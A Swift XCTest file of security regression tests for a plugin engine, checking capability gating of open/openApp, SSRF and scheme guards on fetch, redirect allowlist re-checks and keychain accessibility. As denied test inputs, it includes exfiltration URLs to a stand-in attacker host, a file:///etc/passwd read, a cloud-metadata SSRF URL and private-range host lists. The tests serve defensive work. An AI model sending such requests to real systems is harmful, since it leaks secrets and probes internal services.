import XCTest
import JavaScriptCore
import Security
@testable import VeeEngine
import VeeProtocol
@testable import VeeKeychain

/// Security-hardening regressions for the engineering audit's SEC findings
/// (docs/AUDIT.md §4): SEC-1/SEC-2 (gate `vee.open`/`vee.openApp`), SEC-3
/// (re-check the network allowlist on redirects), SEC-4 (scheme/SSRF guard on
/// `vee.http.fetch`), and SEC-6 (keychain `…ThisDeviceOnly`).
///
/// Mirrors the existing capability-deny style: a denied bridge call is proven to
/// have NEVER reached its provider (`provider.calls == 0` / `requested.isEmpty` /
/// `openedURLs.isEmpty`), and the JS Promise rejects with `capabilityDenied`
/// (-32001). Kept in its own file (per the work split) so it never collides with
/// VeeEngineTests.swift / Wave2bTests.swift / OutOfProcessTests.swift.
final class SecurityHardeningTests: XCTestCase {

    // MARK: - Helpers

    /// A manifest with the given capabilities (default-deny everything else).
    private func manifest(
        id: String = "com.vee.sec",
        network: [String] = [],
        open: [String] = []
    ) -> PluginManifest {
        PluginManifest(
            id: id, name: "Sec", version: "1.0.0", entrypoint: "bundle.js",
            commands: [PluginCommand(name: "view", title: "View", mode: .view)],
            capabilities: Capabilities(network: network, open: open)
        )
    }

    /// Collects notifications a host emits toward the launcher (for `console.*`).
    private final class Recorder {
        let transport: LoopbackTransport
        private(set) var notifications: [JSONRPCNotification] = []
        init(_ transport: LoopbackTransport) {
            self.transport = transport
            transport.peerInbound = { [weak self] message in
                if case .notification(let n) = message { self?.notifications.append(n) }
            }
        }
        func logs() -> [LogParams] {
            notifications.compactMap { note in
                guard note.method == RPCMethods.log, let params = note.params else { return nil }
                let data = try? JSONEncoder().encode(params)
                return data.flatMap { try? JSONDecoder().decode(LogParams.self, from: $0) }
            }
        }
    }

    private func instance(_ manifest: PluginManifest,
                          transport: LoopbackTransport,
                          http: CannedHTTPClient = CannedHTTPClient(),
                          opener: OpenProviding = RecordingOpenProvider()) throws -> PluginInstance {
        try PluginInstance(
            manifest: manifest,
            transport: transport,
            clock: TestClock(),
            httpClient: http,
            openProvider: opener
        )
    }

    // MARK: - SEC-1: vee.open is gated by Capabilities.open

    func testOpenDeniedWhenSchemeNotGranted() throws {
        // open: [] (default-deny). vee.open must reject with -32001 and the
        // provider must NEVER be touched.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(open: []), transport: transport, opener: opener)
        inst.evaluate("""
            vee.open('https://example.com/page')
              .then(() => console.log('opened'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(opener.openedURLs.isEmpty, "a denied open must NEVER reach the provider")
        XCTAssertTrue(opener.openedApps.isEmpty)
    }

    func testOpenAllowedWhenSchemeGrantedWithWildcard() throws {
        // "*" grants every scheme and waives the per-host re-check.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(open: ["*"]), transport: transport, opener: opener)
        inst.evaluate("""
            vee.open('https://example.com/page')
              .then(() => console.log('opened'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["opened"])
        XCTAssertEqual(opener.openedURLs, ["https://example.com/page"])
    }

    func testOpenFileSchemeDeniedByDefaultEvenWithHttpsGranted() throws {
        // SEC-1: file:/non-http(s) is default-denied unless its scheme is listed.
        // Granting only "https" must NOT permit a file:// open.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(network: ["example.com"], open: ["https"]),
                                transport: transport, opener: opener)
        inst.evaluate("""
            vee.open('file:///etc/passwd')
              .then(() => console.log('opened'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(opener.openedURLs.isEmpty, "a file:// open must NEVER reach the provider")
    }

    func testOpenBarePathTreatedAsFileAndDenied() throws {
        // A URL with no scheme (bare absolute path) is treated as file: and must
        // be denied unless "file" (or "*") is granted.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(open: ["https"]), transport: transport, opener: opener)
        inst.evaluate("""
            vee.open('/Applications/Calculator.app')
              .then(() => console.log('opened'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(opener.openedURLs.isEmpty)
    }

    func testOpenHttpsDeniedWhenHostNotInNetworkAllowlist() throws {
        // SEC-1 exfil bypass: granting the https scheme is not enough — an
        // http(s) open is re-checked against the network allowlist, so opening a
        // host outside `network` (the classic "leak token to attacker.com" path)
        // is denied without touching the provider.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(network: ["example.com"], open: ["https"]),
                                transport: transport, opener: opener)
        inst.evaluate("""
            vee.open('https://attacker.com/leak?d=secret')
              .then(() => console.log('opened'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(opener.openedURLs.isEmpty)
    }

    func testOpenHttpsAllowedWhenHostInNetworkAllowlist() throws {
        // The flip side: https scheme granted AND host in the network allowlist →
        // the open is permitted and reaches the provider.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(network: ["example.com"], open: ["https"]),
                                transport: transport, opener: opener)
        inst.evaluate("""
            vee.open('https://example.com/ok')
              .then(() => console.log('opened'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["opened"])
        XCTAssertEqual(opener.openedURLs, ["https://example.com/ok"])
    }

    // MARK: - SEC-2: vee.openApp is gated by Capabilities.open ("bundleId:" entries)

    func testOpenAppDeniedWhenBundleNotGranted() throws {
        // open: [] → openApp denied; provider untouched.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(open: []), transport: transport, opener: opener)
        inst.evaluate("""
            vee.openApp('com.apple.Terminal')
              .then(() => console.log('launched'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(opener.openedApps.isEmpty, "a denied openApp must NEVER reach the provider")
    }

    func testOpenAppDeniedWhenDifferentBundleGranted() throws {
        // Granting one bundle id must not permit launching a different one.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(open: ["bundleId:com.acme.allowed"]),
                                transport: transport, opener: opener)
        inst.evaluate("""
            vee.openApp('com.apple.Terminal')
              .then(() => console.log('launched'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(opener.openedApps.isEmpty)
    }

    func testOpenAppAllowedWhenBundleGranted() throws {
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let opener = RecordingOpenProvider()
        let inst = try instance(manifest(open: ["bundleId:com.apple.Safari"]),
                                transport: transport, opener: opener)
        inst.evaluate("""
            vee.openApp('com.apple.Safari')
              .then(() => console.log('launched'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["launched"])
        XCTAssertEqual(opener.openedApps, ["com.apple.Safari"])
    }

    // MARK: - SEC-4: scheme/SSRF guard on vee.http.fetch

    func testFetchNonHttpSchemeRejectedWithoutTouchingClient() throws {
        // file: must be rejected at the gate even if the "host" were allowlisted.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let http = CannedHTTPClient()
        let inst = try instance(manifest(network: ["etc"]), transport: transport, http: http)
        inst.evaluate("""
            vee.http.fetch('file:///etc/passwd')
              .then(() => console.log('ok'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(http.requested.isEmpty, "a non-http(s) fetch must NEVER reach the client")
    }

    func testFetchLoopbackHostRejectedAtGate() throws {
        // SEC-4: localhost is rejected even when it appears in the network
        // allowlist (SSRF guard runs before the allowlist).
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let http = CannedHTTPClient()
        let inst = try instance(manifest(network: ["localhost"]), transport: transport, http: http)
        inst.evaluate("""
            vee.http.fetch('http://localhost:8080/admin')
              .then(() => console.log('ok'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(http.requested.isEmpty, "a loopback fetch must NEVER reach the client")
    }

    func testFetchLinkLocalMetadataHostRejectedAtGate() throws {
        // The cloud-metadata SSRF target 169.254.169.254 is rejected at the gate.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let http = CannedHTTPClient()
        let inst = try instance(manifest(network: ["169.254.169.254"]),
                                transport: transport, http: http)
        inst.evaluate("""
            vee.http.fetch('http://169.254.169.254/latest/meta-data/')
              .then(() => console.log('ok'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(http.requested.isEmpty, "a link-local fetch must NEVER reach the client")
    }

    func testFetchPlainHttpDeniedUnlessHostAllowlisted() throws {
        // https is the default; plain http is allowed only when the host is in
        // the allowlist. A public http host NOT in `network` is denied.
        let transport = LoopbackTransport()
        let recorder = Recorder(transport)
        let http = CannedHTTPClient()
        let inst = try instance(manifest(network: []), transport: transport, http: http)
        inst.evaluate("""
            vee.http.fetch('http://example.com/x')
              .then(() => console.log('ok'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(recorder.logs().map(\.message), ["denied:-32001"])
        XCTAssertTrue(http.requested.isEmpty)
    }

    func testFetchAllowedHttpsStillThreadsAllowlistToClient() throws {
        // A permitted https fetch reaches the client AND the per-request
        // allowlist (Capabilities.network) is threaded through for the redirect
        // re-check (SEC-3 wiring).
        let transport = LoopbackTransport()
        let http = CannedHTTPClient()
        http.canned["https://api.example.com/data"] = CannedHTTPClient.Response(
            status: 200, headers: [:], body: Data("{}".utf8))
        let inst = try instance(manifest(network: ["api.example.com"]), transport: transport, http: http)
        inst.evaluate("""
            vee.http.fetch('https://api.example.com/data')
              .then(() => console.log('ok'))
              .catch(e => console.error('denied:' + e.code));
        """)
        inst.runUntilQuiescent()
        XCTAssertEqual(http.requested, ["https://api.example.com/data"])
        XCTAssertEqual(http.lastAllowedHosts, ["api.example.com"],
                       "the plugin's network allowlist must be threaded to the client for redirect re-checks")
    }

    // MARK: - SEC-3: redirect re-check refuses a cross-origin redirect

    /// Drive the real `URLSessionTaskDelegate` redirect handler with synthetic
    /// objects (no live server) and assert: a redirect to a host outside the
    /// plugin's network allowlist is REFUSED (completion gets `nil`), a redirect
    /// to a loopback/link-local SSRF target is refused, and a redirect to an
    /// allowlisted host is FOLLOWED.
    func testRedirectToNonAllowlistedHostIsRefused() throws {
        let guardDelegate = URLSessionHTTPClient.RedirectGuard(allowedHosts: ["api.github.com"])
        let session = URLSession(configuration: .ephemeral)
        let task = session.dataTask(with: URL(string: "https://api.github.com/start")!)
        let response = HTTPURLResponse(url: URL(string: "https://api.github.com/start")!,
                                       statusCode: 302, httpVersion: nil, headerFields: nil)!

        /// Returns the request the guard would follow (nil = refused).
        func followed(_ urlString: String) -> URLRequest? {
            var captured: URLRequest?
            var didCall = false
            let req = URLRequest(url: URL(string: urlString)!)
            guardDelegate.urlSession(session, task: task,
                                     willPerformHTTPRedirection: response, newRequest: req) { out in
                captured = out; didCall = true
            }
            XCTAssertTrue(didCall, "the redirect completion handler must always be invoked")
            return captured
        }

        // Cross-origin redirect to an off-allowlist host → refused (nil).
        XCTAssertNil(followed("https://attacker.com/collect?d=exfil"),
                     "a cross-origin redirect outside the allowlist must be refused")
        // Open-redirect bounce to the cloud-metadata IP → refused (SSRF guard).
        XCTAssertNil(followed("http://169.254.169.254/latest/meta-data/"))
        // Bounce to loopback → refused.
        XCTAssertNil(followed("http://127.0.0.1:9000/"))
        // Same-allowlist redirect → followed (non-nil request).
        XCTAssertNotNil(followed("https://api.github.com/next"))

        session.invalidateAndCancel()

        // Also pin the underlying decision helper + SSRF classifier directly.
        let g = URLSessionHTTPClient.RedirectGuard(allowedHosts: ["api.github.com"])
        XCTAssertTrue(g.allowsRedirect(scheme: "https", host: "api.github.com"))
        XCTAssertFalse(g.allowsRedirect(scheme: "https", host: "attacker.com"))
        XCTAssertFalse(g.allowsRedirect(scheme: "ftp", host: "api.github.com"), "non-http(s) redirect refused")
        XCTAssertTrue(isBlockedNetworkHost("169.254.169.254"))
        XCTAssertTrue(isBlockedNetworkHost("127.0.0.1"))
        XCTAssertTrue(isBlockedNetworkHost("10.0.0.5"))
        XCTAssertTrue(isBlockedNetworkHost("192.168.1.1"))
        XCTAssertTrue(isBlockedNetworkHost("172.16.0.1"))
        XCTAssertFalse(isBlockedNetworkHost("172.32.0.1"), "172.32 is outside the private range")
        XCTAssertFalse(isBlockedNetworkHost("8.8.8.8"))
    }

    // MARK: - SEC-6: keychain uses kSecAttrAccessibleWhenUnlockedThisDeviceOnly

    func testKeychainStoreUsesThisDeviceOnlyAccessibility() throws {
        // Assert the policy on the exact add-query the production `set` builds,
        // without writing to the real Keychain.
        let store = KeychainStore()
        let query = store.addQueryForTesting(
            pluginId: "com.vee.github", namespace: "github", account: "token", secret: "s3cr3t")
        let accessible = query[kSecAttrAccessible as String]
        XCTAssertNotNil(accessible)
        XCTAssertEqual(accessible as! CFString, kSecAttrAccessibleWhenUnlockedThisDeviceOnly)
        // Belt-and-suspenders: it is NOT the migrating WhenUnlocked class.
        XCTAssertNotEqual(accessible as! CFString, kSecAttrAccessibleWhenUnlocked)
    }

    // MARK: - Capabilities backward-compatible decode (additive `open` field)

    func testCapabilitiesDecodesWithoutOpenKeyAsDefaultDeny() throws {
        // A manifest written before `open` existed must still decode, with
        // open defaulting to [] (deny).
        let json = """
        { "network": ["api.github.com"], "filesystem": [], "clipboard": false,
          "calendar": false, "keychainNamespaces": ["github"], "hotkeyActions": [] }
        """
        let caps = try JSONDecoder().decode(Capabilities.self, from: Data(json.utf8))
        XCTAssertEqual(caps.open, [], "absent open key must default to deny []")
        XCTAssertEqual(caps.network, ["api.github.com"])
        XCTAssertFalse(caps.allowsOpenApp(bundleId: "com.apple.Terminal"))
        XCTAssertFalse(caps.allowsOpen(scheme: "https", host: "api.github.com"))
    }

    func testCapabilitiesRoundTripsOpenField() throws {
        let caps = Capabilities(network: ["example.com"], open: ["https", "bundleId:com.apple.Safari"])
        let data = try JSONEncoder().encode(caps)
        let back = try JSONDecoder().decode(Capabilities.self, from: data)
        XCTAssertEqual(back.open, ["https", "bundleId:com.apple.Safari"])
        XCTAssertTrue(back.allowsOpen(scheme: "https", host: "example.com"))
        XCTAssertFalse(back.allowsOpen(scheme: "https", host: "other.com"))
        XCTAssertTrue(back.allowsOpenApp(bundleId: "com.apple.Safari"))
        XCTAssertFalse(back.allowsOpenApp(bundleId: "com.apple.Terminal"))
    }
}
